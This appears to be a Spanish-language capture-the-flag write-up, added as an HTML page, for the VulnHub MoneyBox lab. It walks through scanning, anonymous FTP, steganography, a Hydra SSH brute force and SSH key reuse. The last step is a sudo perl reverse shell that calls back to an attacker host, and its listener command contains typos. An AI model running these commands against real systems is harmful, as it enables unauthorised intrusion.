@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Writeup: MoneyBox</title>
+  <link rel="stylesheet" href="../styles.css" />
+  <style>
+    .code-block {
+      position: relative;
+      background: var(--bg-soft);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin: 1rem 0;
+    }
+    .code-block pre {
+      margin: 0;
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: var(--bg);
+      color: var(--accent);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.2rem 0.5rem;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    .copy-btn:hover {
+      background: rgba(64,255,156,0.1);
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+
+    <!-- Imagen opcional de la máquina -->
+    <section class="card">
+      <img src="img/money_box.png" alt="Máquina MoneyBox" class="machine-img"/>
+    </section>
+
+    <!-- Metadatos -->
+    <section class="card">
+      <h2>MoneyBox</h2>
+      <p class="post-desc">Plataforma: VulnHub · Dificultad: Fácil · Fecha: Agosto 2026</p>
+      <ul class="post-tags">
+        <li>#vulnhub</li>
+        <li>#moneybox</li>
+        <li>#reverseshell</li>
+        <li>#perl</li>
+        <li>#esteganografía</li>
+        <li>#ftp</li>
+        <li>#ssh</li>
+      </ul>
+    </section>
+
+    <!-- Reconocimiento -->
+    <section class="card">
+      <h3>Reconocimiento</h3>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>sudo arp-scan -I eth0 --localnet --ignoredups</code></pre>
+      </div>
+      <p>Resultado:</p>
+      <pre><code>10.123.113.172</code></pre>
+      <p>Ahora identificamos los puertos abiertos:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nmap -p- 10.123.113.172 --open -sS -n -Pn --min-rate 50000 -oG allPorts</code></pre>
+      </div>
+      <p>Resultado:</p>
+      <pre><code>Open ports: 21, 22, 80</code></pre>
+      <p>Realizamos un escaneo más exhaustivo para identificar servicios y aplicar scripts básicos:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>nmap -p21,22,80 -sCV 10.123.113.172 -oN targeted</code></pre>
+      </div>
+      <p>Entre lo más interesante:</p>
+      <pre><code>ftp-anon: Anonymous FTP login allowed (FTP code 230)
+_-rw-r--r--    1 0 0 1093656 Feb 26 2021 trytofind.jpg</code></pre>
+      <p>El usuario <code>anonymous</code> está habilitado en FTP, por lo que podemos conectarnos:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ftp 10.123.113.172
+ftp> anonymous
+password:
+ftp> ls
+ftp> get trytofind.jpg</code></pre>
+      </div>
+      <p>La imagen parece ser solo un gato, nada raro. Revisamos metadatos con <code>exiftool</code>:</p>
+      <section class="card">
+            <img src="img/trytofind.jpg" alt="cat_img" class="machine-img"/>
+      </section>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>exiftool trytofind.jpg</code></pre>
+      </div>
+      <p>Tampoco encontramos nada relevante.</p>
+    </section>
+
+    <!-- Enumeración -->
+    <section class="card">
+      <h3>Enumeración</h3>
+      <p>Visitamos la web principal y encontramos un mensaje ASCII con el título “Welcome To MoneyBox CTF”. No había nada útil en el código fuente, así que realizamos fuzzing para buscar rutas ocultas:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>gobuster dir -u http://10.123.113.172/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20</code></pre>
+      </div>
+      <p>Resultado:</p>
+      <pre><code>blogs/ -> 200</code></pre>
+      <p>Dentro del código fuente de <code>blogs/</code> encontramos una pista que dice: (La siguiente pista esta en el directorio oculto S3cr3t-T3xt)</p>
+      <pre><code><!--the hint is the another secret directory is S3cr3t-T3xt--></code></pre>
+      <p>Accedemos a <code>http://10.123.113.172/S3cr3t-T3xt</code> y encontramos otra pista:</p>
+      <pre><code>Secret Key 3xtr4ctd4t4</code></pre>
+      <p>Esta clave parecía ser importante, pero no funcionó en SSH ni en otros servicios. Decidimos volver a analizar la imagen.</p>
+    </section>
+
+    <!-- Explotación -->
+    <section class="card">
+      <h3>Explotación</h3>
+      <p>Recordé la técnica de esteganografía: ocultar información dentro de archivos digitales. Usamos <code>steghide</code> para intentar extraer datos de la imagen con la clave encontrada:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>steghide extract -sf trytofind.jpg</code></pre>
+      </div>
+      <p>El programa pidió una clave; ingresamos <code>3xtr4ctd4t4</code> y obtuvimos un archivo <code>data.txt</code> con el siguiente mensaje:</p>
+      <pre><code>Hello..... renu
+I tell you something important. Your password is too weak, so change it.
+Don't underestimate it.......</code></pre>
+      <p>De aquí deducimos:</p>
+      <ul>
+        <li>Existe un usuario llamado <code>renu</code>.</li>
+        <li>Su contraseña es débil.</li>
+      </ul>
+      <p>Intentamos fuerza bruta con Hydra:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://10.123.113.172</code></pre>
+      </div>
+      <p>Obtuvimos la contraseña y accedimos por SSH como <code>renu</code>:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ssh renu@10.123.113.172 -p 22</code></pre>
+      </div>
+    </section>
+
+    <!-- Escalada de privilegios -->
+    <section class="card">
+      <h3>Escalada de privilegios</h3>
+      <p>Dentro del sistema, el usuario <code>renu</code> no tenía privilegios especiales. Al listar <code>/home</code> encontramos otro usuario: <code>lily</code>.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ls /home</code></pre>
+        <!-- Escalada de privilegios (continuación) -->
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>cd /home/lily/.ssh</code></pre>
+      </div>
+       <p>Dentro de esta ruta encontramos un authorized_key (clave publica) que le pertenece al usuario <code>renu</code>
+        <p>Si listamos la ruta /home/renu/.ssh vemos la <code>id_rsa (clave privada)</code> de <code>renu</code> osea este usuaurio puede conectarse por ssh como el usuario <code>lily</code>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ssh -i id_rsa lily@10.123.113.172 -p 22</code></pre>
+      </div>
+
+      <p>Nos conectamos como <code>lily</code>. Una vez dentro ejecutamos:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>sudo -l</code></pre>
+      </div>
+
+      <p>Podíamos ejecutar como <code>root</code> sin contraseña el binario <code>perl</code>. Con esto montamos una reverse shell:</p>
+
+      <p>En la máquina atacante:</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>ncvl -p 4446</code></pre>
+      </div>
+
+      <p>En la máquina víctima (payload tomado de GTFOBins):</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copiar</button>
+        <pre><code>sudo perl -e 'use Socket;$i="10.0.0.1";$p=1234;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))) {
+  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
+  exec("/bin/sh -i");
+}'</code></pre>
+      </div>
+
+      <p>Y finalmente ganamos acceso a la máquina como <strong>root</strong>.</p>
+    </section>
